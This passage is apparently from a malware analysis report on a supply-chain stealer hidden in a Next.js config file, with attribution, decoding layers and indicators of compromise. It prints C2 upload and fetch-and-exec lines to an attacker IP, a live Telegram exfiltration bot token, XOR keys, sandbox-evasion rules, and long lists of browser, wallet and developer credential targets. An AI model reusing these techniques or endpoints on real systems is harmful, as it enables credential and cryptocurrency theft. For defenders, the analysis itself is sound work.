Port 27017 is MongoDB's default TCP port -- used here to blend with database traffic in network logs. The `/$/boot` path suggests a "bootstrap" endpoint for victim registration. The `Sec-V` header passes a victim version fingerprint.

### Blockchain Dead-Drops

#### TRON Wallets

| Label | Address |
|-------|---------|
| Wallet 1 | `TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF` |
| Wallet 2 | `TFMryB9m6d4kBMRjEVyFRbqKSV1cV2NcpH` |
| Wallet 3 | `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v` |

TRON `raw_data.data` field stores BSC tx hash as: `hex_encode(reversed_utf8_hash)`.  
API: `https://api.trongrid.io/v1/accounts/<wallet>/transactions?only_confirmed=true&only_from=true&limit=1`

#### Aptos Addresses

| Label | Address |
|-------|---------|
| Addr 1 | `0x9d202c824402ca89e9aaccd2390b6f8b332ae743caa1469c695feb2781d56519` |
| Addr 2 | `0x3d2075f97b7b1e3234bd653779d21c605d7d8c6ec9c98d983880be5c7f4f9471` |

Aptos: payload stored in `transaction.payload.arguments[0]`.  
API: `https://fullnode.mainnet.aptoslabs.com/v1/accounts/<addr>/transactions?limit=1`

#### BSC Transactions

| Label | TX Hash |
|-------|---------|
| TX 1 (key1 payload) | `0x9b94b4ffaaaae8...` (full hash from TRON wallet 1 lookup) |
| TX 2 (key2 payload) | `0xbcc976e1c8f3df...` (full hash from TRON wallet 2 lookup) |
| TX 3 (stage 1b ref) | `0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1` |

BSC nodes queried: `bsc-dataseed.binance.org` (primary), `bsc-rpc.publicnode.com` (fallback).  
Method: `eth_getTransactionByHash`. Calldata format: `<prefix>?.?<XOR-encrypted-payload>`.

### XOR Keys

| Key | Value | Length | Used for |
|-----|-------|--------|----------|
| Stage 1 Key 1 | `2[gWfGj;<:-93Z^C` | 16 | BSC calldata -> Stage 1a (outer payload 1) |
| Stage 1 Key 2 | `m6:tTh^D)cBz?NM]` | 16 | BSC calldata -> Stage 1b (outer payload 2) |
| Stage 3 Key A | `2[gWfGj;<:-93Z^C` | 16 | BSC calldata -> Stage 3 (via blockchain dead-drop, payload 1 inner) |
| Stage 3 Key B | `ThZG+0jfXE6VAGOJ` | 16 | C2 HTTP response -> Stage 3 (via direct C2, payload 2 inner) |

Key A (blockchain path) reuses the same key as Stage 1 Key 1. Key B (C2 path) is unique.  
XOR is repeating-key, applied character-by-character: `decrypted[i] = encrypted[i] XOR key[i % key.length]`.

---

## Obfuscation Techniques Summary

| Layer | Technique | Parameters |
|-------|-----------|------------|
| 0-outer | `_$_46e0` shuffle cipher | seed=192110, add1=157/add2=320, mod1=40163/mod2=28225 |
| 0-middle | TpC word-token compression | s=33,a=93,e=96; 20-entry token table |
| 0-inner | `_$af864575` shuffle cipher | different seed, same structure |
| 1a-outer | `fXA` shuffle cipher | seed=3178291, add1=224/add2=308, mod1=44330/mod2=16994 |
| 1a-inner | `_$_7e9d` shuffle cipher | seed=447065, add1=100/add2=504, mod1=53229/mod2=49365 |
| 1b-outer | `DJF` shuffle cipher | seed=934068, add1=103/add2=521, mod1=25714/mod2=40896 |
| 1b-middle | `_$af183572` shuffle cipher | seed=80452, add1=374/add2=590, mod1=50449/mod2=39130 |
| 1b-inner | `_$_9b39`/`_$af775639` shuffle | seed=3935882, add1=471/add2=371, mod1=35190/mod2=32023 |

All shuffle ciphers share the same structural algorithm:
```
for i in 0..n:
    u = seed*(i+add1) + seed%mod1
    v = seed*(i+add2) + seed%mod2
    swap(arr[u%n], arr[v%n])
    seed = (u+v) % seed_mod
split by '%', unescape '#1'->'%', '#0'->'#'
```

---

## Persistence and Evasion

- **Hidden implant location:** Whitespace at end of `next.config.mjs` -- invisible to most diff views
- **Anti-replay guard:** `global._p_t` / 30-second cooldown prevents re-triggering
- **Single-execution guard:** `global._t_t` timestamp in stage 1a
- **Campaign marker:** `global.i = '5-3-161'` (version/campaign ID)
- **Detached process:** `child_process.spawn('node', ['-e', payload2], {detached:true, stdio:'ignore', windowsHide:true}).unref()`
- **Blockchain C2:** Dead-drops cannot be taken down without blockchain-level action; TRON/Aptos transactions are immutable
- **Multi-key XOR:** Two independent keys so partial compromise doesn't reveal both payloads
- **`Function` constructor abuse:** `lyR['constructor']` = `Function`, avoids direct `Function(...)` call
- **No static strings:** All API URLs, addresses, and method names are encoded in shuffle arrays

---

## Attribution Assessment

### Threat Actor: DEV#POPPER / PolinRider -- Lazarus Group (DPRK)

**Confidence: HIGH**

This campaign is a confirmed instance of the DEV#POPPER / PolinRider supply-chain malware family,
attributed with high confidence to **Lazarus Group** (also tracked as Contagious Interview,
DeceptiveDevelopment, Sapphire Sleet, TAG-121, Void Dokkaebi, MITRE G1052) -- a financially
motivated North Korean state-sponsored APT.

#### Direct infrastructure matches (shared with documented DEV#POPPER campaigns)

| Indicator | Our sample | Published DEV#POPPER IOCs | Source |
|-----------|-----------|--------------------------|--------|
| C2 IP | `198.105.127.210` | Explicitly named as "Additional C2 node" | Securonix DEV#POPPER report |
| C2 port | `27017` | ALL primary DEV#POPPER C2 servers use port 27017 (EmbedIO/3.5.2 fingerprint) | eSentire "Everyday I'm Shufflin'" |
| Hosting ASN | AS149440 Evoxt Enterprise, London | All documented DEV#POPPER C2 servers on AS149440 | Ransom-ISAC cross-chain analysis |
| Sec-V header | `Sec-V: 5-3-161` | `Sec-V: <_V value>` on every C2 request | eSentire DEV#POPPER report |
| Blockchain chains | TRON + Aptos + BSC | Identical three-chain dead-drop architecture | Ransom-ISAC, Malwarebytes |
| Python stealer | OmniStealer (3,500+ lines, cross-platform) | OmniStealer is DEV#POPPER Stage 6 | eSentire "Everyday I'm Shufflin'" |
| Stage 3 paths | `/$/boot`, `/$/1` | `/$/boot` and `/$/1` documented | eSentire DEV#POPPER report |
| Telegram exfil | `@file_1018_bot`, group "Z-File" | Telegram fallback for HTTP upload failures | eSentire DEV#POPPER report |
| Injection target | `next.config.mjs` | Next.js config files explicit injection target | Microsoft Contagious Interview report |

#### `_V` campaign version -- confirmed match in format

Stage 3 reads `global._V` to route traffic and identify the victim cluster. In our sample, Stage 0 sets:
```javascript
global['_V'] = global['i'];   // = '5-3-161'  (annotated_payload.js:35)
```

This value is forwarded as the `Sec-V` HTTP header on every C2 request (stage3_human_pretty.js:2478),
allowing the operator to segment victim traffic by campaign, batch, and injection.

**Vercel does NOT appear as a delivery endpoint in our payload.** Our Stage 3 contains references to
Vercel only in the sandbox-evasion layer:
- String `"vercel-sandbox"` at stage3_human_pretty.js:1345 -- a blocked hostname in the CI/sandbox
  fingerprint list (execution aborts if detected)
- `process.env["VERCEL_HIVE_VERSION"]` at stage3_human_pretty.js:1522 -- checked to fingerprint
  Vercel deployment environments (another sandbox abort trigger)

All payload delivery in our sample uses the direct IP `198.105.127.210:27017`. The Vercel CDN
delivery path documented in PolinRider is a separate attack vector (`.vscode/tasks.json` via the
ShoeVista fake-interview template) and is not present in our GitHub-commit-injection variant.

#### Campaign ID format -- consistent with PolinRider

PolinRider documents `global['_V']` values in the format `<campaign>-<batch>-<seq>`, e.g.:
- `8-413`, `8-683`, `8-778`, `8-974` (numeric batches)
- `8-st1` through `8-st59` (sequential injection tags)

Our value `5-3-161` matches this hyphen-delimited integer format, suggesting:
- Campaign `5`, batch `3`, injection sequence `161`
- Or an independent campaign numbering scheme run in parallel

#### Shared blockchain infrastructure (confirmed, public records)

The three-chain dead-drop architecture using the same TRON/Aptos/BSC combination as all documented
DEV#POPPER / PolinRider samples. The Ransom-ISAC cross-chain analysis and Malwarebytes OmniStealer
report both document the identical TRON-to-Aptos-to-BSC relay pattern.

#### TTP overlap

| MITRE ATT&CK | Technique | Observed |
|---|---|---|
| T1195.002 | Supply Chain Compromise: Software Supply Chain | GitHub commit into `zurich-js/zurichjs-website` |
| T1059.007 | JavaScript / Node.js execution | Payload in `next.config.mjs` |
| T1059.006 | Python execution | Stage 4/5 Python harvester |
| T1102 | Web Service -- Dead Drop Resolver | TRON/Aptos/BSC blockchain payload delivery |
| T1027 | Obfuscated Files or Information | 7-layer shuffle cipher + XOR |
| T1082 | System Information Discovery | `os.platform()`, `os.hostname()`, `os.userInfo()`, `os.release()` |
| T1057 | Process Discovery | `tasklist /FO CSV /NH` (Windows), MD5-hash per process for sandbox detection |
| T1555.003 | Credentials from Web Browsers | Chrome/Edge/Firefox password stores, cookie theft |
| T1555 | Credentials from Password Stores | macOS Keychain, GNOME Keyring, Windows Credential Manager |
| T1552.001 | Unsecured Credentials: Credentials in Files | `~/.git-credentials`, VS Code settings, SSH keys |
| T1041 | Exfiltration over C2 Channel | POST /u/f to C2 IP with ZIP archive |
| T1567.002 | Exfiltration to Cloud: Telegram | Fallback Telegram bot `@file_1018_bot` |
| T1140 | Deobfuscate/Decode Files at Runtime | Multi-stage eval() chain |
| T1480 | Execution Guardrails | 52-entry CI/sandbox hostname+username blocklist |
| T1036.005 | Masquerading: Match Legitimate Name | Port 27017 mimics MongoDB; EmbedIO server fingerprint |

#### Infrastructure: Evoxt Enterprise (AS149440) as known APT hosting

Proofpoint documented in 2025-2026 that AS149440 (Evoxt Sdn. Bhd., Malaysia, routed via London)
is "heavily favored" by TA416 (Mustang Panda) for PlugX C2. The same ASN hosts all confirmed
DEV#POPPER/PolinRider C2 servers. Evoxt is a budget VPS provider marketed across APAC with 16
global locations -- cheap, fast provisioning, and permissive abuse response historically.

#### Key sources

- eSentire TRU: "DEV#POPPER RAT and OmniStealer (Everyday I'm Shufflin')" -- Feb 2026
  https://www.esentire.com/blog/north-korean-apt-malware-analysis-dev-popper-rat-and-omnistealer-everyday-im-shufflin
- Securonix: "Analysis of DEV#POPPER" -- 2024/2025
  https://www.securonix.com/blog/analysis-of-devpopper-new-attack-campaign-targeting-software-developers-likely-associated-with-north-korean-threat-actors/
- OpenSourceMalware / PolinRider dossier -- March 2026
  https://github.com/OpenSourceMalware/PolinRider
- Ransom-ISAC: "Cross-Chain TxDataHiding Crypto Heist Part 2" -- 2026
  https://ransom-isac.org/blog/cross-chain-txdatahiding-crypto-heist-part-2/
- Malwarebytes: "OmniStealer Uses the Blockchain to Steal Everything" -- April 2026
  https://www.malwarebytes.com/blog/news/2026/04/omnistealer-uses-the-blockchain-to-steal-everything-it-can
- Nocturnalknight: "The Polinrider and Glassworm Supply Chain Offensive -- Forensic Post-Mortem" -- 2026
  https://nocturnalknight.co/the-polinrider-and-glassworm-supply-chain-offensive-a-forensic-post-mortem/
- Microsoft Security: "Contagious Interview malware via fake job interviews" -- March 2026
  https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/
- MITRE ATT&CK: Contagious Interview (G1052)
  https://attack.mitre.org/groups/G1052/

---

## Remote Access Assessment

### Can the threat actor connect back to a victim machine?

**With the payloads as analyzed: no.**

Stage 5 is a **pure one-shot exfiltrator**. It runs once, harvests credentials, uploads the archive, cleans up after itself, and exits. There is no:

- Reverse shell or bind shell
- Persistent socket listener or C2 polling loop
- Persistence mechanism (no cron entry, no `~/.bashrc` modification, no LaunchAgent `.plist`, no Windows registry Run key)
- Command execution channel

Stage 5 even uses an exclusive file lock (`portalocker` on `/tmp/tmp7A863DD1.tmp` / `%LOCALAPPDATA%\Temp\tmp7A863DD1.tmp`) to prevent a second instance from running concurrently, and writes a session sentinel file on exit. These are anti-duplicate-run guards, not backdoors.

### Indirect re-delivery path via blockchain dead-drop

The actor **retains a re-delivery mechanism** that does not require any persistence on the victim machine. Every time a developer runs `npm run dev`, `npm run build`, or `npm run start` on an affected checkout, Stage 0 fires again (subject to the 30-second `global._p_t` cooldown resetting with each new Node.js process). If the attacker updates the TRON/BSC blockchain transactions to point to a new Stage 3 payload -- one containing a reverse shell, RAT, or ransomware -- the **next startup would deliver it silently**.

The actor also holds a registry of victim unique IDs (registered via `POST /u/e`). The C2 infrastructure could theoretically serve personalised payloads keyed on victim ID, enabling targeted follow-up against specific machines. This cannot be confirmed from the payloads as analysed, but the architecture supports it.

**Summary:** no active remote access with these payloads, but the actor retains asymmetric re-attack capability via the immutable blockchain dead-drop for as long as any affected developer still has the poisoned repo version on disk.

### Stage 3 sandbox evasion -- how platform is detected

Stage 3 uses four Node.js `os` module calls to collect environment data, then runs compound checks requiring both a hostname pattern AND a username match:

```javascript
const os = require('os');
z = os.platform()            // 'win32', 'linux', 'darwin'
A = os.hostname()            // machine hostname
B = os.userInfo().username   // current username
C = os.release()             // kernel/OS release string
// also checked:
process.env.K_SERVICE        // Google Cloud Run
process.env.VERCEL_HIVE_VERSION
```

Most blocking rules are compound `(hostname condition) AND (username condition)` -- not single-field lookups. Examples:

```
hostname.startsWith("build-") || hostname === "buildkitsandbox"
  AND  username === "root" || username === "buildbot"         -> BLOCKED

hostname === "localhost" || /^srv\d+$/.test(hostname)
  AND  username === "root" || username === "ssm-user"         -> BLOCKED

username === "runner" AND os.release().includes("-azure")     -> BLOCKED

/^[0-9a-f]{12}$/.test(hostname)   // Docker container ID
  AND  username === "ubuntu"  AND  release includes "linuxkit" -> BLOCKED
```

On Windows only, Stage 3 additionally runs `tasklist /FO CSV /NH`, MD5-hashes each process name, and blocks if any hash equals `9a47bb48b7b8ca41fc138fd3372e8cc0` (a specific sandbox/analysis tool whose identity is hidden behind the hash -- unhashable without a rainbow table or brute force over known tool names).

Requiring both hostname AND username to match prevents false positives -- a developer who happens to have username `runner` on a real machine with a normal hostname passes cleanly.

---

## Confirmed Final Payload Behavior (All Stages Decoded)

All four stages have been decoded. This is no longer speculative -- Stage 3 behavior is confirmed from the live 65KB payload retrieved from `198.105.127.210:27017/$/boot`.

**Stage 3 -- confirmed RAT/backdoor (65,438 bytes):**

1. **CI/sandbox exit**: checks 52 environment fingerprints; reports `"(Blocked)"` and exits if running in CI/sandbox/analysis environment
2. **Victim registration**: POSTs MD5-derived victim ID + environment fingerprint to `198.105.127.210:27017` with campaign tags `EV-4A6OE6M0E` / `EV-CHQG3L42M`
3. **Python bootstrap**: installs Python if absent (Linux: `get-pip.py`; Windows: `python.7z + 7zr.exe`)
4. **Stage 4 fetch**: retrieves Python payload via same TRON->BSC dead-drop chain using XOR key `2[gWfGj;<:-93Z^C`
5. **Python execution**: `spawn('python3', ['-c', <payload>], {detached:true})`
6. **Retry loop**: 3 retries at 15-second intervals; error reporting back to C2

**Stage 4 -- Python payload (embedded in Stage 3, fetches Stage 5 from C2):**  
The Python code is assembled from Stage 3's RC4 string table (136 fragments). It spawns a detached subprocess that fetches `GET http://198.105.127.210:27017/$/1` and `exec()`s the response. Stage 5 (`/$/1` response) is not recoverable without probing the live C2 -- it is the ultimate credential harvester payload.

**Stage 5 -- Live C2 Python credential harvester (`/$/1`):**  
Fetched via raw TCP socket to avoid victim registration. Response: 32,737-byte chunked HTTP stream. Obfuscation: `exec(obfDecode(b'...'))` where `obfDecode(data) = zlib.decompress(base64.b64decode(data[::-1]))` -- reversed base64 then zlib inflate. Decoded: 81,539 bytes / 1,129 lines of Python. Full behavioral analysis: see S.5 below and `/root/c2_data/stage5_decoded.py` / `/root/c2_data/stage5_pretty.py`.

**Assessment: This is a multi-stage supply-chain dropper delivering a full-featured credential harvester.** Stage 5 is a professional-grade infostealer targeting all major browsers, 100+ crypto wallet extensions, desktop wallets, password managers, and developer credentials. The victim registration and campaign IDs (`EV-4A6OE6M0E`, `EV-CHQG3L42M`) suggest an organized campaign tracking infected machines. Sandbox evasion across all 5 stages and CI/bot detection in Stage 5 ensure the payload only runs on real developer workstations.

---

## S. 5 -- Stage 5: Python Credential Harvester (Live C2 Payload)

### 5.1 Delivery and Obfuscation

- **Endpoint:** `GET http://198.105.127.210:27017/$/1`
- **Headers:** `User-Agent: Mozilla/5.0 ... Chrome/131.0.0.0 ...`, `Sec-V: <victim_version>`
- **Response:** chunked HTTP, `Content-Type: application/octet-stream`, nginx/1.28.0
- **Raw size:** 32,737 bytes (chunked) -> 81,539 bytes decoded
- **Obfuscation layer:** single-expression `exec(obfDecode(b'<bytes>'))` where:
  ```python
  def obfDecode(data):
      return zlib.decompress(base64.b64decode(data[::-1]))
  ```
  Data is base64-encoded in reverse -- string must be reversed before decode, then zlib-inflated.
- **Variable naming:** all top-level names are 1-2 char aliases (`A=os`, `F=sys`, `P=subprocess`, `AN=requests`, etc.), deliberate obfuscation of a readable codebase.

### 5.2 Anti-Analysis / Anti-Rerun

- **Lockfile:** acquires `portalocker` lock on `tmp7A863DD1.tmp`; any second invocation exits immediately.
- **CI/bot detection (Linux-only):** if `sys.platform.startswith('linux')` AND `not 'microsoft-standard-WSL2' in uname` AND credential count = 0 AND extension count = 0 AND Firefox extension count = 0:
  ```
  -> deletes output directory
  -> sends C2 notification: "Blocked (BOT)"
  -> exits without uploading anything
  ```
  This silently exits on any headless Linux CI box or Docker container with no browser profile.

### 5.3 System Fingerprinting

Collected immediately on startup and written to `login/_sysenv.json` and `login/_sysenv.env`:

- Full `os.environ` dump (every environment variable)
- `hostname`, `username`, `platform`, `cwd`
- `sys.version` (Python version)
- Unique ID: `{hostname}${username}` -- used as `client_id` in all uploads

Output staging directory:
```
Linux/Mac:   ~/.npm/{hostname}${username}[_fc|_f]_{YYMMDD_HHMMSS}/
Windows:     %LOCALAPPDATA%\.npm\{hostname}${username}[_fc|_f]_{YYMMDD_HHMMSS}/
```

### 5.4 Credential Theft -- Chromium Browsers

**Function `B9(export_path)`** -- full Chromium credential extractor.

**Browsers targeted (10 classes):**
| Class | Browser | Platform |
|-------|---------|---------|
| `B4` | Google Chrome | Win/Mac/Linux |
| `B5` | Chromium | Win/Mac/Linux |
| `B6` | Opera / Opera Beta / Opera Developer | Win/Mac/Linux |
| `B7` | Opera GX | Win/Mac |
| `B9` | Brave | Win/Mac/Linux |
| `BA` | Microsoft Edge | Win/Mac/Linux |
| `BB` | Arc | Win/Mac |
| `BC` | Dia | Win/Mac |
| `BD` | Comet | Win/Mac |
| `BE` | Vivaldi | Win/Mac/Linux |

**Per-browser theft:**
- **Saved passwords** -- decrypts `Login Data` SQLite: Windows via DPAPI CryptUnprotectData + AES-256-GCM (v10+ Chromium encryption), macOS via OSX Keychain (`osx_keychain`), Linux via secretstorage (dbus / jeepney) or KWallet (dbus / jeepney)
- **Cookies** -- decrypts `Cookies` SQLite with same key derivation; renames `Cookies` to `_Cookies` to avoid browser lock
- **Saved credit cards** -- decrypts `Web Data` SQLite payment instruments

**Fallback `Ap(target_path)`:** recursive glob for any `Login Data` SQLite not matched by the class list -- copies raw DB files for offline decryption.

### 5.5 Credential Theft -- Firefox / Gecko

**Function `CQ(export_path)`** -- full Firefox NSS credential extractor.

- Locates `profiles/*/key4.db` and `logins.json` via glob across `%LOCALAPPDATA%`, `%APPDATA%`, `~/Library/Application Support/`, `~/.config/`, `~/.*`, `~/snap/`, `~/.var/` (Flatpak), recursive
- Decrypts Firefox master key from `key4.db` using `PBKDF2-SHA256` + `3DES-CBC` (legacy) or `AES-256-CBC` (new)
- Decrypts individual login entries from `logins.json` using ASN.1-parsed PBE structures
- Exports: decrypted username + password pairs for every saved Firefox login

### 5.6 Crypto Wallet Extension Theft

**Function `CR(target_path, local_storage_path)`** -- browser extension data stealer.

Scans `Local Extension Settings`, `Sync Extension Settings`, and `IndexedDB/chrome-extension_*` directories across all browsers on all platforms (including `/mnt/*/Users/*/AppData/...` -- WSL-mounted Windows drives from Linux).

**Extension categories targeted:**

*Password Managers (copied via `Local Extension Settings`):*
```
aeblfdkhhhdcdjpifhhbdfgpgknn    1Password
hdokiejnpimakedhajhdlcegeplioahd LastPass
fooolghllnmhmmndgjiamiiodkpenpbb NordPassLegacy
nngceckbapebfimnlniiiahkandclblb Bitwarden (Nightly)
pnlccmojcmeohlpggmfnbbiapkmbliob RoboForm
bfogiafebfohielmmehodmfbbebbbpei Keeper
ghmbeldphafepmbegfdlkpapadhbakde ProtonPass
oboonakemoehhijpcpmjimcccnkdnaad KeePassXC
... and 20+ more
```

*2FA / Auth Apps (via `Sync Extension Settings`):*
```
bhghoamapcdpbohphigoooaddinpkbai GoogleAuthenticator
```

*Crypto Wallets (via `Local Extension Settings` -- 100+ IDs):*
```
nkbihfbeogaeaoehlefnkodbefgpgknn  MetaMask
ljfoeinjpaedjfecbmggjgodbgkmjkjk  MetaMask Flask
bfnaelmomeimhlpmgjnjophhpkkoljpa  Phantom
ibnejdfjmmkpcnlpebklmnkoeoihofec  TronLink
aheklkkgnmlknpgogcnhkbenfllfcfjb  TronLink (Edge)
egjidjbpglichdcondbcjjjafjapjc    Trust Wallet
fhbohimaelbohpjbbldcngcnapndodjp  Binance
hnfanknocfeofbddgcijnmhnfnkdnaad  Coinbase
dlcobpjiigpikoobohmabehhmhfoodbb  ArgentX (Starknet)
dmkamcknogkgcdfhhbddcghachkejeap  Keplr (Cosmos)
acmacodkjbdgmoleebolmdjonilkdbch  Rabby
idnnbdplmphpflfnlkomgpfbpcgelopg  Xverse (Bitcoin)
phkbamefinggmakgklpkljjmgibohnba  Pontem (Aptos)
ejbalbakoplchlghecdalmeeiajnimhm  MetaMask Edge
mcohilncbfahbmgdjkbpemcciiolgcge  OKX Wallet
eiaeiblijfjekdanodkjadfinkhbfgcd  Safepal
fdjamakpfbbddfjaooikfcpapjohcfmg  1Password (extension)
nphplpgoakhhjchkkhmiggakijnkhfnd  TON Wallet
bhhhlbepdkbapadjdnnojkbgioiodbic  Solflare
kkpllkodjeloidieedojogacfhpaihoh  Enkrypt
ppbibelpcjmhbdihakflkdcoccbgbkpo  UniSat (Bitcoin Ordinals)
afbcbjpbpfadlkmhmclhkeeodmamcflc  Math Wallet
fnjhmkhhmkbjkkabndcnnogagobneec   Ronin (Axie)
lpfcbjknijpeeillifnkikgncikgfhdo  Nami (Cardano)
fpkhgmpbidmiogeglndfbkegfdlnajnf  Cosmostation
... 75+ more wallet extensions
```

**Priority sub-list `A9`** (15 extensions -- copied first regardless of full list):
MetaMask, MetaMask Edge, Phantom, Trust, TronLink, Rabby, Keplr, Xverse, OKX, Coinbase, 1Password, LastPass, Bitwarden, NordPass, Safepal

### 5.7 Firefox Extension Theft

**Function `CS(target_path)`** -- Firefox extension data stealer.

Copies `moz-extension://` IndexedDB storage for all Firefox profiles. Targets same wallet/password manager extensions via Firefox-specific storage paths. Covers `%LOCALAPPDATA%`, `%APPDATA%`, `~/Library/`, `~/.*/`, `~/.config/`, Flatpak (`~/.var/`), Snap (`~/snap/`).

### 5.8 Desktop Application Theft

**Function `CT(target_path)`** -- desktop wallet and developer tool stealer.

**Category 1 -- Crypto wallets (cross-platform):**
```
Exodus/exodus.wallet       # Exodus wallet keystore
atomic/Local Storage       # Atomic Wallet storage
Electrum/wallets           # Electrum wallet files + config
Bitcoin/wallets            # Bitcoin Core wallet.dat
Dogecoin/wallets.dat       # Dogecoin Core wallet
Monero/wallets             # Monero GUI wallet
bitmonero/wallets          # Monero daemon wallet
Ledger Live/Local Storage  # Ledger Live app data
Ledger Live/Session Storage
@trezor/suite-desktop/Local Storage   # Trezor Suite
@trezor/suite-desktop/Session Storage
@trezor/suite-desktop/IndexedDB
solana/id.json             # Solana CLI keypair
```

**Category 2 -- Password managers (desktop):**
```
1Password/1password.sqlite           # 1Password database
1Password/1password_resources.sqlite
Dashlane/profiles                    # Dashlane profiles
Bitwarden/ (full dir)                # Bitwarden local vault
NordPass/ (full dir)                 # NordPass local vault
```

**Category 3 -- Developer credentials:**
```
.git-credentials              # stored Git HTTP passwords
.config/git/credentials       # Git credential store
.config/gh/hosts.yml          # GitHub CLI auth tokens
GitHub Desktop/logs           # GitHub Desktop session logs
VSCode/state.vscdb            # VSCode extension storage (secrets, auth tokens)
VSCode/state.vscdb.backup
VSCode/storage.json
```

**Category 4 -- Misc:**
```
WinAuth/                   # Windows Authenticator (2FA seeds)
Proxifier4/Profiles/       # network proxy config (targets, credentials)
```

**macOS extra:** copies `~/Library/Keychains/login.keychain-db` raw -- full macOS login keychain including all saved passwords, certificates, and SSH keys.

**WSL awareness (Linux):** additionally globs `/mnt/*/Users/*/AppData/...` to steal from any Windows drives mounted inside WSL2.

### 5.9 System Credential Dump

**Function `CU()`** -- OS-level credential enumeration.

- **Windows:** calls `CredEnumerateW` (Windows Credential Manager API) via ctypes to read all stored network passwords, web credentials, and generic credentials from the Windows Vault
- **Linux:** reads `secretstorage` (GNOME Keyring / KWallet) for all stored secrets  
- **macOS:** returns None (keychain is copied raw in CT instead)

Output saved to `login/_credentials.json`.

### 5.10 Cloud Storage Detection

**Function `CX()`** -- inventories which cloud sync clients are present.

Detected: Dropbox, Google Drive, OneDrive, SkyDrive, iCloud Drive, Box, MEGA, MEGAsync, pCloud.  
Reported to C2 in the beacon payload. Used to locate additional files of interest.

### 5.11 Exfiltration Pipeline

**Step 1 -- Archive:** packs staging directory with `pyzipper.AESZipFile`:
```
compression: LZMA -> BZIP2 -> DEFLATE (attempts in order)
encryption:  WZ_AES (AES-256 WinZip-compatible)
password:    ',./,./,./'  (hardcoded)
```
Archive naming: `{hostname}${username}[_fc|_f]_{YYMMDD_HHMMSS}#{MD5[:8]}.zip`

**Step 2 -- C2 registration:** `POST http://198.105.127.210:27017/u/e`
```json
{
  "client_id": "{hostname}${username}",
  "unique_id": "<portalocker session id>",
  "data": {
    "username": "...", "hostname": "...", "os": "...", "uname": "...", "cwd": "...",
    "python": "...", "sid": "...",
    "credentials_count": N, "extensions_count": N, "priority_extensions": N,
    "extension_dirs": N, "firefox_extensions": N
  }
}
```
Response JSON contains `token` (Telegram bot token) and `target`/`client_id` (Telegram chat ID).

**Step 3 -- HTTP upload:** `POST http://198.105.127.210:27017/u/f`
```
multipart/form-data fields:
  client_id = "{hostname}${username}"
  path      = "_auto"
  sid       = <session_id>
  files     = [("basename.zip", <fileobj>), ...]
```
Falls back to `curl` if `requests` upload fails.

**Step 4 -- Telegram upload (optional):** if HTTP upload fails or `-tg` flag set, and file < 50 MB:
```
POST https://api.telegram.org/bot{token}/sendDocument
  chat_id  = {telegram_target}
  document = <zip file>
```

**Step 5 -- Cleanup:** deletes local archive after successful upload (either HTTP or Telegram).

**Step 6 -- Second archive:** if `_2` directory exists (local extension storage), repeats Steps 1-5 with `{AB}_2#{md5}.zip`.

### 5.12 C2 Notification Channel

`POST http://198.105.127.210:27017/verify-human/{channel}` -- real-time operator alerts.

Sent at: startup, BOT detection, packing start, HTTP upload success/fail, Telegram upload success/fail, `[END]`.

Payload format:
```json
{
  "text": "[{hostname}] {hostname}${username} / {uname}\n{status_message}",
  "file_name": "...",
  "file_content": "..."
}
```

### 5.13 Constants and Key Values

```python
CJ = ',./,./,./'         # AES ZIP archive password
CI = 'target'            # C2 response field for Telegram chat ID
CH = 'python'            # sys.version field name
Ah = 'http://198.105.127.210:27017'   # C2 base URL (set at runtime from Stage 4 _target)
```

Runtime-resolved constants (set from Stage 4 subprocess args):
```python
Request._target = 'http://198.105.127.210:27017'
Request._V      = <victim_version from Sec-V>
Request._F      = <flag from Stage 4>
```

---

## Indicators of Compromise (IOCs)

### Network

```
198.105.127.210        # C2 server
  :443   HTTP (plain, not TLS)  -- outer stage reference
  :80    HTTP                   -- outer stage fallback
  :27017 HTTP /$/boot           -- Stage 3 delivery (inner payload 2, port mimics MongoDB)
api.trongrid.io                  # TRON blockchain dead-drop API
fullnode.mainnet.aptoslabs.com   # Aptos blockchain dead-drop API
bsc-dataseed.binance.org         # BSC JSON-RPC (stage 3 payload delivery)
bsc-rpc.publicnode.com           # BSC JSON-RPC fallback
```

**Fake User-Agent (sent to C2 on port 27017):**
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
```

**Custom C2 fingerprint header:**
```
Sec-V: <victim_version_value>
```

### Telegram Exfil Channel (Stage 5 -- Live)

Dynamically provisioned per-victim via `POST /u/e` registration response. Verified live 2026-05-06.

```
Bot token:    7870147428:AAGbYG_eYkiAziCKRmkiQF-GnsGTic_3TTU
Bot ID:       7870147428
Bot username: @file_1018_bot
Bot name:     "File Bot"
Chat ID:      -4697384025
Chat type:    Group
Chat name:    "Z-File"

Upload URL:   https://api.telegram.org/bot{TOKEN}/sendDocument
Trigger:      HTTP upload fail OR -tg flag; file must be < 50 MB
Purpose:      Central operator collection channel for victim ZIP archives
```

> Note: Token may rotate if operator detects analysis. Report to Telegram @abuse for bot termination.

### Blockchain Addresses

```
TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF   # TRON wallet 1
TFMryB9m6d4kBMRjEVyFRbqKSV1cV2NcpH   # TRON wallet 2
TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v    # TRON wallet 3
0x9d202c824402ca89e9aaccd2390b6f8b332ae743caa1469c695feb2781d56519   # Aptos addr 1
0x3d2075f97b7b1e3234bd653779d21c605d7d8c6ec9c98d983880be5c7f4f9471   # Aptos addr 2
0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1   # BSC tx 3
```

### Runtime Globals (detect in Node.js memory)

```javascript
global._p_t          // 30-sec cooldown timestamp (stage 0)
global.i === '5-3-161'  // campaign marker
global._t_t          // stage 1a execution timestamp
global._t_s === 'http://198.105.127.210:443'  // C2 primary URL
global._t_u === 'http://198.105.127.210:80'   // C2 fallback URL
global._H  === 'http://198.105.127.210:27017' // C2 port-27017 base (inner payload 2)
global._H2 === 'http://198.105.127.210:27017' // same, redundant copy
global._t_1          // TRON wallet in use ('TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF')
global._t_2          // Aptos address in use ('0x9d202c824402ca89e9...')
global._t_c          // stage 1a source (exfil buffer)
global._t_0          // decoded base64 bootstrap script
global.___dirname    // captured __dirname
global.___filename   // captured __filename
global._R            // reporting/C2 callback function
